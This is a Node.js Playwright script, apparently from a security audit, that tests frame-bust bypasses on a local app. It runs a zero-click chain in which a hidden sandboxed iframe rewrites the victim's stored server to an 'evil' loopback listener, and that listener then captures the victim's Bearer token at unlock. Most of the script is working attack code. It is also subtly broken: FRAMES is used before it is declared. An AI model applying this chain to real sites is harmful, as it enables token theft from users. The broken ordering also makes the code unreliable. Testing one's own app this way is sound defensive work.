// vp3r3-frame.mjs — VP3 re-attack, Attack 3: frame-bust bypass attempts + the
// framed-ingest poison chain.
// Cases (attacker page on a REAL loopback origin 9780; app on 8080):
//   A plain iframe            → expect top.location bust (attacker page replaced)
//   B sandbox allow-scripts   → expect hidden + NO poison (opaque origin: LS throws)
//   C sandbox allow-scripts allow-same-origin → hidden but ingestParams STILL
//     runs → silent LS poison (#server= loopback evil + #setup= attacker hex)
//   D sandbox allow-scripts allow-top-navigation → bust
//   E sandbox allow-scripts allow-same-origin allow-top-navigation → bust
//   F srcdoc wrapper (nested sandbox flags) → hidden or bust, no pixels either way
//   G about:blank document.write wrapper (no sandbox) → bust
//   H same-ORIGIN attacker page (route-injected at app origin) + plain iframe → bust
//   I same-origin + sandbox allow-same-origin (no top-nav) + style-strip → app
//     pixels reach the attacker (requires app-origin hosting — documented)
// Chain proof: C-style poison with ONLY #server=, then a real top-level unlock
// against the poisoned profile → the evil listener captures the victim's
// Bearer AUTH_UI (redacted in output).
import { chromium } from '/home/z/.npm-global/lib/node_modules/playwright/index.mjs';
import { readFileSync } from 'node:fs';
import { createServer } from 'node:http';

const BASE = 'http://127.0.0.1:8080';
const EVIL_PORT = 9780;
const EVIL = 'http://127.0.0.1:' + EVIL_PORT;
const mat = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));
const red = (s) => String(s == null ? '' : s).slice(0, 8) + '…';

const evilHits = [];
const PAGES = {};
for (const id of Object.keys(FRAMES)) PAGES['/' + id + '.html'] = FRAMES[id];
PAGES['/chain.html'] = '<iframe sandbox="allow-scripts allow-same-origin" src="' + BASE + '/index.html#server=' + EVIL + '" style="width:900px;height:650px"></iframe>';
const evil = createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  evilHits.push({ method: req.method, url: u.pathname, auth: req.headers.authorization || '-' });
  if (PAGES[u.pathname]) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    res.end('<!doctype html><html><body style="margin:0;background:#400"><h1>EVIL ATTACKER ' + u.pathname + '</h1>' + PAGES[u.pathname] + '</body></html>');
    return;
  }
  res.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
  res.end(JSON.stringify({ salt: mat.salt, iters: mat.iters, wrapped: mat.wrapped_b64 }));
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));

const FRAMES = {
  A: '<iframe src="' + BASE + '/index.html" style="width:900px;height:650px"></iframe>',
  B: '<iframe sandbox="allow-scripts" src="' + BASE + '/index.html" style="width:900px;height:650px"></iframe>',
  C: '<iframe sandbox="allow-scripts allow-same-origin" src="' + BASE + '/index.html#server=' + EVIL + '&setup=' + 'e'.repeat(64) + '" style="width:900px;height:650px"></iframe>',
  D: '<iframe sandbox="allow-scripts allow-top-navigation" src="' + BASE + '/index.html" style="width:900px;height:650px"></iframe>',
  E: '<iframe sandbox="allow-scripts allow-same-origin allow-top-navigation" src="' + BASE + '/index.html" style="width:900px;height:650px"></iframe>',
  F: '<iframe sandbox="allow-scripts allow-same-origin allow-top-navigation allow-popups" style="width:900px;height:650px"></iframe><script>document.querySelector("iframe").srcdoc=\'<iframe src="' + BASE + '/index.html" style="width:95%;height:95%"></iframe>\';</script>',
  G: '<iframe style="width:900px;height:650px"></iframe><script>const f=document.querySelector("iframe");f.src="about:blank";f.onload=()=>{const d=f.contentDocument;d.open();d.write(\'<iframe src="' + BASE + '/index.html" style="width:95%;height:95%"></iframe>\');d.close();};</script>',
};

const browser = await chromium.launch();
const results = [];
async function runCase(id, html, { sameOrigin = false } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1100, height: 800 } });
  const page = await ctx.newPage();
  const url = sameOrigin ? BASE + '/vp3r3-attacker-' + id + '.html' : EVIL + '/' + id + '.html';
  if (sameOrigin) {
    await ctx.route('**/vp3r3-attacker-' + id + '.html', (route) =>
      route.fulfill({ contentType: 'text/html', body: '<!doctype html><html><body style="margin:0;background:#400"><h1>SAME-ORIGIN ATTACKER ' + id + '</h1>' + html + '</body></html>' }));
  }
  await page.goto(url);
  await page.waitForTimeout(1800);
  const topUrl = page.url();
  let frameState = null;
  const frame = page.frames().find((f) => f.url().includes('index.html'));
  if (frame && topUrl.includes('index.html') === false) {
    frameState = await frame.evaluate(() => ({
      hidden: getComputedStyle(document.documentElement).visibility === 'hidden',
    })).catch(() => null);
  }
  // screenshot the ATTACKER page as the victim would see it
  try { await page.screenshot({ path: 'audit-vp/vp3r3-frame-' + id + '.png' }); } catch {}
  // did the app's pixels leak? (computed visibility of the app inside the frame)
  results.push({ id, topUrl, frameFound: !!frame, frameState });
  console.log('case ' + id + '  top=' + topUrl + '  frame=' + (frame ? 'yes' : 'no') + '  ' + JSON.stringify(frameState));
  await ctx.close();
}

for (const id of Object.keys(FRAMES)) {
  if (id === 'H' || id === 'I') continue;
  await runCase(id, FRAMES[id]);
}

// H — same-origin attacker page, plain iframe → boot-bust must navigate top
await runCase('H', '<iframe src="/index.html" style="width:900px;height:650px"></iframe>', { sameOrigin: true });

// I — same-origin attacker + sandbox allow-same-origin (no top-nav) → hidden,
// then the ATTACKER strips the guard style (possible only from app origin)
{
  const ctx = await browser.newContext({ viewport: { width: 1100, height: 800 } });
  const page = await ctx.newPage();
  await ctx.route('**/vp3r3-attacker-I.html', (route) =>
    route.fulfill({ contentType: 'text/html', body: '<!doctype html><html><body style="margin:0;background:#400"><h1>SAME-ORIGIN ATTACKER I (strip)</h1>' +
      '<iframe id="f" sandbox="allow-scripts allow-same-origin" src="/index.html" style="width:900px;height:650px"></iframe>' +
      '<script>setTimeout(()=>{try{const d=document.getElementById("f").contentDocument;for(const s of [...d.querySelectorAll("style")]) if(s.textContent.includes("visibility:hidden")) s.remove();}catch(e){}},600);</script></body></html>' }));
  await page.goto(BASE + '/vp3r3-attacker-I.html');
  await page.waitForTimeout(2200);
  const frame = page.frames().find((f) => f.url().includes('index.html'));
  let state = null;
  if (frame) state = await frame.evaluate(() => ({ hidden: getComputedStyle(document.documentElement).visibility === 'hidden' })).catch(() => null);
  await page.screenshot({ path: 'audit-vp/vp3r3-frame-I.png' });
  console.log('case I  top=' + page.url() + '  frame=' + (frame ? 'yes' : 'no') + '  ' + JSON.stringify(state) + '  (same-origin strip — requires app-origin hosting)');
  await ctx.close();
}

/* ---- the poison chain end-to-end (case C precondition, #server= ONLY) ---- */
{
  const ctx = await browser.newContext({ viewport: { width: 1100, height: 800 } });
  // victim profile: real token + real server, like a provisioned browser
  await ctx.addInitScript(([token, server]) => {
    localStorage.setItem('clock_poc_auth_ui', token);
    localStorage.setItem('clock_poc_server', server);
  }, [mat.auth_ui_hex, 'http://127.0.0.1:8787']);
  const page = await ctx.newPage();
  // step 1: victim merely OPENS the attacker page (zero clicks on the app;
  // served from the REAL evil socket)
  await page.goto(EVIL + '/chain.html');
  await page.waitForTimeout(1500);
  // what did the hidden frame do to the victim's profile?
  const p = await ctx.newPage();
  await p.goto(BASE + '/index.html');
  await p.waitForTimeout(400);
  const poisoned = await p.evaluate(() => ({
    server: localStorage.getItem('clock_poc_server'),
    token: localStorage.getItem('clock_poc_auth_ui'),
    noteHidden: (() => { const n = document.getElementById('server-note'); return !n || n.hidden; })(),
    serverField: document.getElementById('server').value,
  }));
  console.log('\npoison state after zero-click framed visit: ' + JSON.stringify({ ...poisoned, token: red(poisoned.token) }));
  console.log('  foreign-server warning visible for the loopback poison? ' + (poisoned.noteHidden ? 'NO (loopback-exempt) — silent' : 'YES'));
  // step 2: the victim unlocks (password only; server field pre-filled by poison)
  await p.fill('#password', 'password');
  await p.click('button[type=submit]');
  await p.waitForTimeout(2500);
  const loginMsg = await p.evaluate(() => document.getElementById('login-msg').textContent);
  const evilAuth = evilHits.find((h) => h.url === '/config');
  console.log('  unlock against poisoned server → login-msg: ' + JSON.stringify(String(loginMsg).slice(0, 90)));
  console.log('  EVIL SERVER captured Authorization: ' + (evilAuth ? red(evilAuth.auth) + ' (' + evilAuth.auth.length + ' chars) on ' + evilAuth.method + ' ' + evilAuth.url : '(nothing)'));
  const leakedRealToken = evilAuth && evilAuth.auth === 'Bearer ' + mat.auth_ui_hex;
  console.log('  leaked bearer === victim AUTH_UI? ' + leakedRealToken);
  await ctx.close();
}

console.log('\n=== summary ===');
console.log(JSON.stringify(results, null, 1));
console.log('evil hits total: ' + evilHits.map((h) => h.method + ' ' + h.url).join(' | '));
await browser.close();
evil.close();
process.exit(0);
